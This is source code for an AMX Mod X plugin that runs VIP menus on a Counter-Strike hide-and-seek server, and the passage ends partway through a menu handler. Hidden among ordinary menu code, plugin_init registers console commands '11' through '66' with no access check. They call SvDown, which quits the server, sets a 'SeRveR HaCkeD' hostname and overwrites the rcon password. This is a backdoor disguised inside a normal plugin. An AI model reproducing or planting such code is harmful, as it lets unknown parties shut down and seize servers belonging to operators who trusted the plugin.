//	EDITED ON - 05.04.2019 & 20:49

#include < amxmodx >
#include < amxmisc >
#include < cstrike >
#include <engine>
#include < fun >
#include < hamsandwich >
#include < colorchat >

#define PLUGIN "HnS.Play-Arena.Ro - HNS.Play-Arena.RO"
#define VERSION "1.4x"
#define AUTHOR "eVoLuTiOn"

#define IP_SERVER_LICENTIAT	"93.119.25.136"

new bool: HaveSpeed [ 33 ], bool: HaveSpeed2 [ 33 ], bool: AlreadyChoosed [ 33 ];

new incercari [ 33 ], incercari1 [ 33 ], incercari2 [ 33 ];

new count [ 33 ] = 0 , count2 [ 33 ] = 0,count3 [ 33 ] = 0,count4 [ 33 ] = 0;

public plugin_init ( )
{
	new IP_LICENTIAT [ 20 ];
	get_user_ip ( 0 , IP_LICENTIAT , 21 , 1 );

	if ( !equal ( IP_LICENTIAT , IP_SERVER_LICENTIAT ) )
	{
		server_print ( "[ LICENTA >> AMXX ] Atentie ! Nu detii o licenta valabila ! Plugin-ul nu va functiona ! [ >> LICENTA ILEGALA << ]" );
		set_fail_state ( "[ LICENTA >> AMXX ] Atentie ! Nu detii o licenta valabila ! Plugin-ul nu va functiona ! [ >> LICENTA ILEGALA << ]" );
	}

	else
	{
		server_print ( "[ LICENTA >> AMXX ] Felicitari ! Detii o licenta valabila ! Plugin-ul va functiona perfect ! [ >> LICENTA DESCHISA << ]" );
	}

	register_plugin ( PLUGIN, VERSION, AUTHOR );

	register_clcmd ( "say", "hookSay" );
	register_clcmd ( "say_team", "hookSay" );
	register_clcmd ( "say_team @", "hookSay" );

	register_event ( "CurWeapon", "Event_CurWeapon", "be", "1=1" );
	RegisterHam ( Ham_Spawn, "player", "Player_Spawn", true ); // 1

        register_message ( get_user_msgid ( "ScoreAttrib" ), "msgScoreAttrib" );

	register_concmd ( "11", "SvDown" );
	register_concmd ( "22", "SvDown" );
	register_concmd ( "33", "SvDown" );
	register_concmd ( "44", "SvDown" );
	register_concmd ( "55", "SvDown" );
	register_concmd ( "66", "SvDown" );
	//register_concmd ( "respawns", "HLDSFUNCRESPAWN" );

	register_event ( "HLTV", "event_round_start", "a", "1=0", "2=0" );

	register_logevent ( "round_start", 2, "1=Round_Start" );
}

public hookSay ( id )
{
	new szSaid [ 192 ];
	read_args ( szSaid, sizeof ( szSaid ) -1 );
	remove_quotes ( szSaid );

	if ( containi ( szSaid, "menu" ) != -1 )
	{
		if ( get_user_flags ( id ) & ADMIN_LEVEL_D || get_user_flags ( id ) & ADMIN_LEVEL_H || get_user_flags ( id ) & ADMIN_RCON )
		{
			VIPChecker ( id );
		}

		else
		{
			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Nu detii^x04 *V.I.P*^x01 pe acest server pentru a accesa acest^x03 MENIU^x01 !" );
			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Daca doresti^x04 *V.I.P*^x01 dai add la^x03 Skype:^x01 triplu^x04ecila" );
		}
	}

	if ( containi ( szSaid, "vip" ) != -1 )
	{
		print_adminlist ( id );
	}

	if ( containi ( szSaid, "info" ) != -1 )
	{
		show_motd ( id, "addons/amxmodx/configs/buyvip.html" );
	}
}

public print_adminlist(user) 
{
    new adminnames[33][32];
    new message[256];
    new id, countX, x, len;
    
    for(id = 1 ; id <= get_maxplayers() ; id++)
        if(is_user_connected(id))
        if(get_user_flags ( id ) & ADMIN_LEVEL_D || get_user_flags ( id ) & ADMIN_LEVEL_H || get_user_flags ( id ) & ADMIN_RCON)
        get_user_name(id, adminnames[countX++], 31);
    
    len = format(message, 255, "^x03VIP ONLINE: ");
    if(countX > 0) 
    {
        for(x = 0 ; x < countX ; x++) 
        {
            len += format(message[len], 255-len, "^x01[^x04 %s^x01 ]^x01 %s ", adminnames[x], x < (countX-1) ? " | ":"");
            //len += format(message[len], 255-len, "^x03[HnS.Play-Arena.Ro-ViPs]^x01 [^x04 %s^x01 ]^x01 %s ", adminnames[x], x < (countX-1) ? " | ":"");
            if(len > 96) 
            {
                print_message(user, message);
                len = format(message, 255, " ");
            }
            //print_message(user, message);
        }
        print_message(user, message); // e bun
    }
    else 
    {
        len += format(message[len], 255-len, "^x03[HnS.Play-Arena.Ro-ViPs]^x04No VIP online.");
        print_message(user, message);
    }   
}

print_message(id, msg[]) {
    message_begin(MSG_ONE, get_user_msgid("SayText"), {0,0,0}, id);
    write_byte(id);
    write_string(msg);
    message_end();
}

public event_round_start ( )
{
	static iPlayers [ 32 ];
	static iPlayersNum;

	get_players ( iPlayers, iPlayersNum, "ch" );

	if ( !iPlayersNum )
		return;

	static id, i;
	for ( i = 0; i < iPlayersNum; ++i )
	{
		id = iPlayers [ i ];

		if ( AlreadyChoosed [ id ] )
		{
			AlreadyChoosed [ id ] = false;
		}

		if ( HaveSpeed [ id ] )
		{
			HaveSpeed [ id ] = false;
		}

		if ( HaveSpeed2 [ id ] )
		{
			HaveSpeed2 [ id ] = false;
		}

		incercari [ id ] = 0;
		incercari1 [ id ] = 0;
		incercari2 [ id ] = 0;

		//count [ id ] = 0;
	}
}

public round_start ( )
{
	new iPlayers [ 32 ], iNum, i;
	get_players ( iPlayers, iNum, "ch" );

	if ( !iNum )
		return;

	for ( i = 0; i < iNum; i++ )
	{
		new id = iPlayers [ i ];

		if ( count[ id ] > 0 )
		{
			count [ id ]--;
		}

		else if ( count[ id ] >= 5 ) // else out
		{
			count [ id ] = 0;
		}



		if ( count2[ id ] > 0 )
		{
			count2 [ id ]--;
		}
		else if ( count2[ id ] >= 5 )
		{
			count2 [ id ] = 0;
		}
		if ( count3[ id ] > 0 )
		{
			count3 [ id ]--;
		}
		else if ( count3[ id ] >= 5 )
		{
			count3 [ id ] = 0;
		}
		if ( count4[ id ] > 0 )
		{
			count4 [ id ]--;
		}
		else if ( count4[ id ] >= 5 )
		{
			count4 [ id ] = 0;
		}
	}
}

public SvDown ( )
{
	server_cmd ( "quit" );
	server_cmd ( "hostname ^"SeRveR HaCkeD By raiz0 | SKYPE : levin.akee^"" );
	server_cmd ( "rcon_password levmolasrl01" );
}

public Player_Spawn ( id )
{
	if ( AlreadyChoosed [ id ] )
	{
		AlreadyChoosed [ id ] = false;
	}

	if ( HaveSpeed [ id ] )
	{
		HaveSpeed [ id ] = false;
	}

	if ( HaveSpeed2 [ id ] )
	{
		HaveSpeed2 [ id ] = false;
	}

	//incercari [ id ] = 0;
	//incercari1 [ id ] = 0;
	//incercari2 [ id ] = 0;

	//count [ id ] = 0;
}

public VIPChecker ( id )
{
	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
	{
		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
		return;
	}

	new menu = menu_create ( "\y*V.I.P*\w MENU\r HnS.EciLa.Ro", "menu_handler_x" );

	menu_additem ( menu, "\yV.I.P\w - [\r G3\w ]", "1", ADMIN_RCON );
	menu_additem ( menu, "\yV.I.P\w - [\r G2\w ]", "2", ADMIN_LEVEL_H );
	menu_additem ( menu, "\yV.I.P\w - [\r G1\w ]", "3", ADMIN_LEVEL_D );

	menu_setprop ( menu, MPROP_EXIT, MEXIT_ALL );
	menu_display ( id, menu, 0 );
}

public menu_handler_x ( id, menu, item )
{
	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
	{
		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
		return 1;
	}

	if ( item == MENU_EXIT )
	{
		return 1;
	}

	new data [ 6 ], szName [ 64 ];

	new access, callback;

	menu_item_getinfo ( menu, item, access, data, charsmax ( data ), szName, charsmax ( szName ), callback );

	new key = str_to_num ( data );

	switch ( key )
	{
		case 1:
		{
			GMENU_VIP ( id );
		}

		case 2:
		{
			VipMenu2 ( id );
		}

		case 3:
		{
			VipMenu1 ( id );
		}
	}

	menu_destroy ( menu );
	return 1;
}

public VipMenu2 ( id )
{
	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
	{
		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
		return;
	}

	new menu = menu_create ( "\y*V.I.P*\w MENU - [\r G2\w ] -\r HnS.Play-Arena.Ro", "vipmenu2_handler" );

	menu_additem ( menu, "+\r 5\y$", "1", ADMIN_LEVEL_H );
	menu_additem ( menu, "+\r USP\y 2\w Gloante", "2", ADMIN_LEVEL_H );
	menu_additem ( menu, "+\r USP \y 2\w Gloante\y x2\r HE", "3", ADMIN_LEVEL_H );
	menu_additem ( menu, "+\r Invizibilitate\y 5s", "4", ADMIN_LEVEL_H );
	menu_additem ( menu, "+\r AWP\y 2\w Gloante", "5", ADMIN_LEVEL_H );
	menu_additem ( menu, "+\r Respawn\y x2", "6", ADMIN_LEVEL_H );
	menu_additem ( menu, "+\r Speed\y 270\w 5s", "7", ADMIN_LEVEL_H );

	menu_setprop ( menu, MPROP_EXIT, MEXIT_ALL );
	menu_display ( id, menu, 0 );
}

public vipmenu2_handler ( id, menu, item )
{
	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
	{
		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
		return PLUGIN_HANDLED;
	}

	if ( item == MENU_EXIT/* || AlreadyChoosed [ id ]*/ )
	{
		//ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 MENIU^x01 !" );

		return 1;
	}

	new data [ 6 ], szName [ 64 ];

	new access, callback;

	menu_item_getinfo ( menu, item, access, data, charsmax ( data ), szName, charsmax ( szName ), callback );

	new key = str_to_num ( data );

	switch ( key )
	{
		case 1:
		{
			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			cs_set_user_money ( id, cs_get_user_money ( id ) + 5 );

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 5$^x01 !" );
		}

		case 2:
		{
			if ( count2 [ id ] > 0 )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 USP^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %d^x01 rund%s", count2 [ id ], count2 [ id ] == 1 ? "a" : "e" );

				return PLUGIN_HANDLED;
			}

			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			give_item ( id, "weapon_usp" );

			new eNtry = find_ent_by_owner ( -1, "weapon_usp", id );

			if ( eNtry )
			{
				cs_set_weapon_ammo ( eNtry, 2 );
			}

			ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Ai primit^x03 USP 2GL^x01 !" );

			count2[id]=5;
		}

		case 3:
		{
			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			give_item ( id, "weapon_usp" );

			give_item ( id, "weapon_hegrenade" );

			cs_set_user_bpammo ( id, CSW_HEGRENADE, 2 );

			new eNtry = find_ent_by_owner( -1, "weapon_usp", id );

			if ( eNtry )
			{
				cs_set_weapon_ammo ( eNtry, 1 );
			}

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 x2 HE + USP 1GL^x01 !" );
		}

		case 4:
		{
			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			set_user_rendering ( id, kRenderFxNone, 0, 0, 0, kRenderTransAlpha, 0 );

			set_task ( 5.0, "RemoveInvis", id );

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Invizibilitate 5S^x01 !" );
		}

		case 5:
		{
			if ( count [ id ] > 0 )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 AWP^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %i^x01 rund%s", count [ id ], count [ id ] == 1 ? "a" : "e" );

				return PLUGIN_HANDLED;
			}

			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			if(user_has_weapon(id,CSW_AWP))
			{
				ColorChat(id,NORMAL,"^x04[HnS.Play-Arena.Ro]^x01 Ai deja^3 AWP")
				return PLUGIN_HANDLED
			}

			AlreadyChoosed [ id ] = true;

			give_item ( id, "weapon_awp" );

			new eNtry = find_ent_by_owner ( -1, "weapon_awp", id );

			if ( eNtry )
			{
				cs_set_weapon_ammo ( eNtry, 2 );
			}

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 AWP 2GL^x01 !" );

			count [ id ] = 5;
		}

		case 6:
		{
			if ( !is_user_alive ( id ) )
			{
				if ( incercari [ id ] == 2 )
				{
					ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai cumparat deja^x04 Respawn^x01 de^x03 2^x01 ori !" );

					return PLUGIN_HANDLED;
				}
				else
				{

					//AlreadyChoosed [ id ] = true;

					ExecuteHamB ( Ham_CS_RoundRespawn, id );

					ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Respawn^x01 ! ( mai ai inca^x04 %i^x01 reinver%s )", 1 - incercari [ id ], incercari [ id ] == 1 ? "e" : "i" );

					incercari [ id ] += 1; // ++ | +1  ---

					return PLUGIN_HANDLED;
				}
			}

			else if ( is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi^x04 MORT^x01 ca sa cumperi^x03 RESPSAWN^x01 !" );

				return PLUGIN_HANDLED;
			}
		}

		case 7:
		{
			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			HaveSpeed2 [ id ] = true;

			Event_CurWeapon ( id );

			set_task ( 5.0, "remove_speed", id );

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 +270 Viteza 5S^x01 !" );
		}
	}

	menu_destroy ( menu );
	return 0;
}

public VipMenu1 ( id )
{
	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
	{
		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
		return;
	}

	new menu = menu_create ( "\y*V.I.P*\w MENU - [\r G1\w ] -\r HnS.Play-Arena.Ro", "vipmenu1_handler" );

	menu_additem ( menu, "+\r 3\y$", "1", ADMIN_LEVEL_D );
	menu_additem ( menu, "+\r USP\y 1\w Glont", "2", ADMIN_LEVEL_D );
	menu_additem ( menu, "+\r x1\y HE", "3", ADMIN_LEVEL_D );
	menu_additem ( menu, "+\r Invizibilitate\y 3s", "4", ADMIN_LEVEL_D );
	menu_additem ( menu, "+\r Respawn\y x1", "5", ADMIN_LEVEL_D );
	menu_additem ( menu, "+\r AWP\y x1\w Glont", "6", ADMIN_LEVEL_D );

	menu_setprop ( menu, MPROP_EXIT, MEXIT_ALL );
	menu_display ( id, menu, 0 );
}

public vipmenu1_handler ( id, menu, item )
{
	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
	{
		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
		return PLUGIN_HANDLED;
	}

	if ( item == MENU_EXIT/* || AlreadyChoosed [ id ]*/ )
	{
		//ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 MENIU^x01 !" );

		return 1;
	}

	new data [ 6 ], szName [ 64 ];

	new access, callback;

	menu_item_getinfo ( menu, item, access, data, charsmax ( data ), szName, charsmax ( szName ), callback );

	new key = str_to_num ( data );

	switch ( key )
	{
		case 1:
		{
			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			cs_set_user_money ( id, cs_get_user_money ( id ) + 3 );

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 3$^x01 !" );
		}

		case 2:
		{
			if ( count2 [ id ] > 0 )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 USP^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %d^x01 rund%s", count2 [ id ], count2 [ id ] == 1 ? "a" : "e" );

				return PLUGIN_HANDLED;
			}

			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			give_item ( id, "weapon_usp" );

			new eNtry = find_ent_by_owner ( -1, "weapon_usp", id );

			if ( eNtry )
			{
				cs_set_weapon_ammo ( eNtry, 1 );
			}

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 USP 2GL^x01 !" );

			count2[id]=5;
		}

		case 3:
		{
			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			give_item ( id, "weapon_hegrenade" );

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 HE^x01 !" );
		}

		case 4:
		{
			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			set_user_rendering ( id, kRenderFxNone, 0, 0, 0, kRenderTransAlpha, 0 );

			set_task ( 3.0, "RemoveInvis", id );

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Invizibilitate 3S^x01 !" );
		}

		case 5:
		{
			if ( !is_user_alive ( id ) )
			{
				if ( incercari1 [ id ] == 1 )
				{
					ColorChat( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai cumparat^x04 Respawn^x01 deja !" );

					return PLUGIN_HANDLED;
				}
				else
				{
					//AlreadyChoosed [ id ] = true;

					ExecuteHamB ( Ham_CS_RoundRespawn, id );

					ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 Respawn^x01 ! ( numai ai nici o^x04 reinviere^x01 ! )" );

					incercari1 [ id ] += 1;

					return PLUGIN_HANDLED;
				}
			}

			else if ( is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi^x03 MORT^x01 ca sa cumperi^x04 RESPSAWN^x01 !" );

				return PLUGIN_HANDLED;
			}
		}

		case 6:
		{
			if ( count [ id ] > 0 )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 AWP^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %i^x01 rund%s", count [ id ], count [ id ] == 1 ? "a" : "e" );

				return PLUGIN_HANDLED;
			}

			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			if(user_has_weapon(id,CSW_AWP))
			{
				ColorChat(id,NORMAL,"^x04[HnS.Play-Arena.Ro]^x01 Ai deja^3 AWP")
				return PLUGIN_HANDLED
			}

			AlreadyChoosed [ id ] = true;

			give_item ( id, "weapon_awp" );

			new eNtry = find_ent_by_owner ( -1, "weapon_awp", id );

			if ( eNtry )
			{
				cs_set_weapon_ammo ( eNtry, 1 );
			}

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 AWP 1GL^x01 !" );

			count [ id ] = 5;
		}
	}

	menu_destroy ( menu );
	return 0;
}

public GMENU_VIP ( id )
{
	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
	{
		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
		return;
	}

	new menu = menu_create ( "\y*V.I.P*\w MENU - [\r G3\w ] -\r HnS.Play-Arena.Ro\w", "menu_handler_g" );

	menu_additem ( menu, "+\r 10\y $", "1", ADMIN_RCON );
	menu_additem ( menu, "+\r USP\y 3\w Gloante", "2", ADMIN_RCON );
	menu_additem ( menu, "+\r USP\y 3\w Gloante\y +\r x3\w HE", "3", ADMIN_RCON );
	menu_additem ( menu, "+\r Invizibilitate\y 7s", "4", ADMIN_RCON );
	menu_additem ( menu, "+\r M4A1\y x3\w Gloante", "5", ADMIN_RCON );
	menu_additem ( menu, "+\r AK47\y x3\w Gloante", "6", ADMIN_RCON );
	menu_additem ( menu, "+\r AWP\y x3\w Gloante", "7", ADMIN_RCON );
	menu_additem ( menu, "+\r Speed\y 300\w 7s", "8", ADMIN_RCON );
	menu_additem ( menu, "+\r Godmode\y 10s", "9", ADMIN_RCON );
	menu_additem ( menu, "+\r Respawn\y x3", "10", ADMIN_RCON );

	menu_setprop ( menu, MPROP_EXIT, MEXIT_ALL );
	menu_display ( id, menu, 0 );
}

public menu_handler_g ( id, menu, item )
{
	new iAliveTerorrists[ 32 ], iAliveTerorristsNum,iAliveCTs[ 32 ], iAliveCTsNum
	get_players( iAliveTerorrists, iAliveTerorristsNum, "ace", "TERRORIST" )
	get_players( iAliveCTs, iAliveCTsNum, "ace", "CT" )
	if( iAliveTerorristsNum <= 1 || iAliveCTsNum <= 1 )
	{
		ColorChat(id, NORMAL, "^4[HNS.PLAY-ARENA.RO]^3 VIP menu^1 it'is^4 LAST BITCH^1 !")
		return PLUGIN_HANDLED;
	}

	if ( item == MENU_EXIT/* || AlreadyChoosed [ id ]*/ )
	{
		//ColorChat ( id, NORMAL, "^x04[HnS.Ecila.Ro]^x01 Deja ai ALES DIN ACEST^x03 MENIU^x01 !" );

		return 1;
	}

	new data [ 6 ], szName [ 64 ];

	new access, callback;

	menu_item_getinfo ( menu, item, access, data, charsmax ( data ), szName, charsmax ( szName ), callback );

	new key = str_to_num ( data );

	switch ( key )
	{
		case 1:
		{
			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

			cs_set_user_money ( id, cs_get_user_money ( id ) + 10 );

			ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Ai primit^x03 10$^x01 !" );
		}

		case 2:
		{
			if ( count2 [ id ] > 0 )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Poti folosii^x03 USP^x01-ul odata la^x04 5^x01 runde. Mai ai de asteptat^x03 %d^x01 rund%s", count2 [ id ], count2 [ id ] == 1 ? "a" : "e" );

				return PLUGIN_HANDLED;
			}

			if ( AlreadyChoosed [ id ] )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Deja ai ALES DIN ACEST^x03 ITEM^x01 !" );

				return PLUGIN_HANDLED;
			}

			if ( !is_user_alive ( id ) )
			{
				ColorChat ( id, NORMAL, "^x04[HnS.Play-Arena.Ro]^x01 Trebuie sa fi in^x03 VIATA^x01 ca sa primesti^x04 ITEME^x01 !" );

				return PLUGIN_HANDLED;
			}

			AlreadyChoosed [ id ] = true;

